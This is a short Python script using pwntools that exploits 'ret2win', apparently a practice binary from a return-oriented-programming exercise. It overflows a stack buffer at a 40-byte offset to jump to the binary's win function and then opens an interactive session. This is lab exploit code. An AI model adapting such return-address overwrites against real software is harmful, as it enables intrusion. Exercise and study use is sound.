from pwn import *

exe = ELF("./bins/ret2win")
context.binary = exe
context.log_level='error'

offset= 40

payload = flat ({
    offset:[
        (exe.functions.ret2win)
        ]
    })

io = process(exe.path)
io.sendlineafter(b"\n> ", payload)
io.interactive()



















